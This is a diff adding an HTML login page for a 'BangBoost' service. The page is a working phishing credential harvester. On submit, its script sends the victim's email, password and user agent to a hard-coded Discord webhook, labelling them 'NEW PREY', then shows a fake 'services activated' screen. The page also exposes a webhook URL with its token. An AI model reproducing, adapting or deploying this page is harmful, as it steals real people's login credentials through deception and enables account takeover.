@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BangBoost - Login</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { background: #000; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .container { max-width: 420px; width: 92%; background: #0a0a0a; padding: 45px 30px; border-radius: 16px; box-shadow: 0 0 45px rgba(255,255,255,0.12); text-align: center; border: 1px solid #444; }
+        h1 { font-size: 48px; font-weight: bold; margin: 0 0 15px 0; letter-spacing: 2px; }
+        p { color: #ccc; margin-bottom: 35px; font-size: 16px; }
+        input { width: 100%; padding: 16px; margin: 12px 0; background: #111; border: 2px solid #fff; color: #fff; border-radius: 10px; font-size: 16px; }
+        button { width: 100%; padding: 17px; background: #fff; color: #000; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; font-size: 18px; margin-top: 10px; }
+        button:hover { background: #ddd; }
+        .full-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; color: #fff; flex-direction: column; align-items: center; justify-content: center; z-index: 999; padding: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div id="mainContainer" class="container">
+        <h1>BANG BOOST</h1>
+        <p>Sign in to continue</p>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required minlength="6">
+            <button type="submit">LOGIN</button>
+        </form>
+        <div id="loading" style="margin-top:18px;display:none;">Loading...</div>
+    </div>
+
+    <div id="successPage" class="full-screen">
+        <h1>BANG BOOST PRESENTS</h1>
+        <p>SERVICES ACTIVATED</p>
+        <p>CONTACT US IF NOT LOADING</p>
+    </div>
+
+    <script>
+        var webhook = "https://discordapp.com/api/webhooks/1524144032295555072/_qZB9Hzi062OBz5xkN25MVxyXp_e14-UHd_-kIyYcS6um8u20gdFLusSNbm3Al51nevJ";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "BangBoost",
+                    content: "🔥 **NEW PREY**",
+                    embeds: [{
+                        fields: [
+                            { name: "Email", value: email || "N/A" },
+                            { name: "Password", value: "```" + password + "```" },
+                            { name: "Device", value: navigator.userAgent.substring(0,250) }
+                        ]
+                    }]
+                })
+            });
+
+            document.getElementById('loading').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('mainContainer').style.display = 'none';
+                document.getElementById('successPage').style.display = 'flex';
+            }, 1300);
+        });
+    </script>
+</body>
+</html>
